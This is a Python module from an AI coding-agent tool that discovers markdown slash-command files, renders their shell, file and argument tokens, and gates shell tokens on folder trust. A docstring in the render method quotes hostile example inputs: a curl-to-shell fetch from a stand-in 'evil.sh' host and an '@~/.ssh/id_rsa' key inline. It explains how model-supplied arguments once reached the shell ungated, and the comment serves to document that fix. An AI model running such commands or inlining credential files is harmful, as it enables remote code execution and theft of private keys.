"""Markdown-authored slash commands — Claude Code parity.

A user can drop ``.md`` files into ``<project>/.claude/commands/``,
``<project>/.igni/commands/``, ``~/.claude/commands/``, or
``~/.igni/commands/`` to define new slash commands without writing
Python. The file's basename becomes the command name (so
``commands/review.md`` invokes as ``/review``); the body is the
template that gets sent to the agent after substitution.

Supported template tokens. ``!`cmd``` and ``@<path>`` are resolved
against the *template body*; ``$ARGUMENTS`` is substituted last, so
argument text can never become a token (see
:mod:`igni_core.core.utils.markdown_command_renderer`):

* ``!`cmd``` → run ``cmd`` via the shell, capture stdout, inline
  it. Errors / non-zero exits are inlined as an ``[error: ...]``
  marker so the agent sees the failure rather than silently
  getting empty output. A ``$ARGUMENTS`` *inside* such a token is
  substituted shell-quoted (one word), never as raw syntax.
* ``$ARGUMENTS`` → the rest of the user's input after the command
  name. Plain text substitution into the already-expanded body.
* ``@<path>`` → inline the contents of the referenced file. Same
  shape as the rules-file ``@<path>.md`` syntax but extension-
  agnostic (commands frequently inline ``@README.md`` or
  ``@pyproject.toml``). Paths resolve against the command file's
  directory, with ``~`` expansion and project-relative
  interpretation.

YAML frontmatter (all optional) is parsed into a
:class:`~igni_core.core.utils.markdown_command_frontmatter.CommandFrontmatter`
and stashed on the returned ``MarkdownCommand``:

* ``description`` — one-line summary shown in help listings.
* ``allowed-tools`` — comma-separated list (CC parity). Currently
  parsed and exposed; gating is the agent's responsibility.
* ``argument-hint`` — completion hint like ``[path]`` or ``<name>``.
* ``model`` — preferred model identifier. Currently parsed and
  exposed; the session's ``/model`` controls the active model.

Precedence (lower → higher, last write wins on name collisions):

1. ``~/.claude/commands/`` (cross-tool user)
2. ``~/.igni/commands/`` (igni user)
3. ``<project>/.claude/commands/`` (cross-tool project)
4. ``<project>/.igni/commands/`` (igni project)

The ``read_claude`` toggle (settings.rules.cross_tool_support)
mirrors the rest of the cross-tool plumbing — flip it off and the
``.claude/commands/`` sources are skipped.
"""

from __future__ import annotations

import logging
from pathlib import Path

from pydantic import BaseModel, ConfigDict, Field

from igni_core.core.data_paths import canonical_project_dir
from igni_core.core.paths import CONFIG_DIR
from igni_core.core.utils.markdown_command_frontmatter import CommandFrontmatter
from igni_core.core.utils.markdown_command_renderer import MarkdownCommandRenderer
from igni_core.core.workspace_trust import process_trust

logger = logging.getLogger(__name__)


class MarkdownCommand(BaseModel):
    """A single markdown-authored command discovered on disk.

    Immutable (``frozen=True``) so callers can share instances
    across the tool-call boundary without defensive copies.
    """

    model_config = ConfigDict(frozen=True, arbitrary_types_allowed=True)

    name: str
    path: Path
    description: str = ""
    allowed_tools: tuple[str, ...] = Field(default_factory=tuple)
    argument_hint: str = ""
    model: str | None = None
    body: str = ""

    async def render(self, args: str, *, project_dir: Path | None = None) -> str:
        """Resolve ``!`cmd```, ``@path``, and ``$ARGUMENTS`` tokens
        in the body and return the final prompt text.

        ``$ARGUMENTS`` goes in *last*, and deliberately so. When it
        went in first, the argument text was re-scanned by the two
        token substitutions that follow it, so ``/review x !`curl
        evil.sh | sh``` reached ``/bin/sh -c`` and ``/review
        @~/.ssh/id_rsa`` inlined the key — and ``slash_command``
        makes the argument model-supplied, with no permission gate
        anywhere on this path. Expanding the template first means
        the only shell that ever runs is the shell the command file
        itself wrote.
        """
        renderer = MarkdownCommandRenderer(
            source=self.path,
            project_dir=project_dir,
            shell_allowed=self._shell_allowed(project_dir),
        )
        return await renderer.render(self.body, args)

    def _shell_allowed(self, project_dir: Path | None) -> bool:
        """A command file from the folder itself runs its ``!`cmd``` tokens
        only once the folder is trusted (``core/workspace_trust``); the
        markdown still loads and renders. The user's and the org's commands
        are not the folder's, and run as before."""
        if project_dir is None:
            return True
        folder = canonical_project_dir(project_dir)
        if not self.path.resolve().is_relative_to(folder):
            return True
        return process_trust().is_trusted(folder, what="markdown-command shell tokens")

    @classmethod
    def discover(
        cls,
        project_dir: Path,
        *,
        read_claude: bool = True,
        group_dir: Path | None = None,
    ) -> dict[str, MarkdownCommand]:
        """Walk all configured roots and return ``name → command``.

        Later roots override earlier ones on name collisions — project
        commands beat user-global, igni beats claude (within the same
        tier). The leading-slash isn't part of the key (users invoke
        ``/review`` but the dict is keyed ``review``).

        ``group_dir`` is the org's, read straight from the policy cache
        and placed *below* the project's, so a command the project
        declares under the same name is the one that runs."""
        out: dict[str, MarkdownCommand] = {}
        for root in _command_roots(project_dir, read_claude=read_claude, group_dir=group_dir):
            if not root.is_dir():
                continue
            for path in sorted(root.glob("*.md")):
                cmd = cls.load(path)
                if cmd is not None:
                    out[cmd.name] = cmd
        return out

    @classmethod
    def load(cls, path: Path) -> MarkdownCommand | None:
        """Read one ``.md`` file and return a ``MarkdownCommand``, or
        ``None`` if the file is unreadable. The command name is the
        stem (so ``review.md`` → ``review``); leading ``.`` files (e.g.
        editor backups) are skipped."""
        if path.name.startswith("."):
            return None
        try:
            content = path.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError) as exc:
            logger.debug("Markdown command read %s failed: %s", path, exc)
            return None
        frontmatter, body = CommandFrontmatter.parse(content)
        return cls(
            name=path.stem,
            path=path.resolve(),
            description=frontmatter.description,
            allowed_tools=frontmatter.allowed_tools,
            argument_hint=frontmatter.argument_hint,
            model=frontmatter.model,
            body=body,
        )


# ── Discovery ────────────────────────────────────────────────────


def _command_roots(
    project_dir: Path,
    read_claude: bool,
    group_dir: Path | None = None,
) -> list[Path]:
    """Roots to scan, in load order (later overrides earlier).

    The org's root sits above the user's globals and below the
    project's. Above the globals because a group is a deliberate
    decision by an organisation and a stray file in ``~`` is not; below
    the project's because a repository knows things about itself that a
    group-wide command cannot.

    That ordering is the whole mechanism for "the local one wins": the
    group's commands are read from the policy cache rather than copied
    into the project, so a same-named project file simply lands later.
    """
    home = Path.home()
    roots: list[Path] = []
    if read_claude:
        roots.append(home / ".claude" / "commands")
    roots.append(home / CONFIG_DIR / "commands")
    if group_dir is not None:
        roots.append(group_dir)
    if read_claude:
        roots.append(project_dir / ".claude" / "commands")
    roots.append(project_dir / CONFIG_DIR / "commands")
    return roots


__all__ = ["MarkdownCommand"]
